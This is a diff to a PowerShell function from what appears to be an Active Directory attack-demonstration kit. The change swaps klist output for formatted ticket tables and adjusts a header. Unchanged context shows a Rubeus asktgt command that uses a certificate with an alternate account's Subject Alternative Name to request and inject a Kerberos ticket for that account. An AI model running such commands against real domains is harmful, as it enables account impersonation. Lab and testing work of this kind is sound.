@@ -28,7 +28,7 @@ function Request-TGTWithRubeus {
     If (-not $SkipClearHost) { Clear-Host }
     
     Invoke-Output -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
-    Invoke-Output -T Bullet -M "Request a ticket-granting ticket for the account that was added`n    as Subject Alternative Name (SAN) to the issued certificate."
+    Invoke-Output -Type  H1 -Message "Request a ticket-granting ticket for the account that was added`nas Subject Alternative Name (SAN) to the issued certificate."
     
     $domain = $AlternativeAccount.FQDN
     $user = $AlternativeAccount.samaccountname
@@ -43,7 +43,10 @@ function Request-TGTWithRubeus {
     Invoke-Command -ScriptBlock { & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$user /domain:$domain /certificate:$pfxFile /ptt /enctype:aes256 } | Out-Host
 
     If (-not $UnAttended) { pause }
-    klist
+    $tickets = Get-KlistTicket
+    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+    Invoke-Output -Type Info -Message "Last Ticket"
+    $tickets | Select-object -Last 1 | Format-List
     If (-not $UnAttended) { pause }
 
     Write-Host "____________________________________________________________________`n" 
@@ -55,7 +58,10 @@ function Request-TGTWithRubeus {
     If (-not $UnAttended) { pause }
     If (-not $SkipClearHost) { Clear-Host }
 
-    klist
+    $tickets = Get-KlistTicket
+    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+    Invoke-Output -Type Info -Message "Last Ticket"
+    $tickets | Select-object -Last 1 | Format-List
     If (-not $UnAttended) { pause }
 
     Write-Log -Message "    >> using $PfxFile"
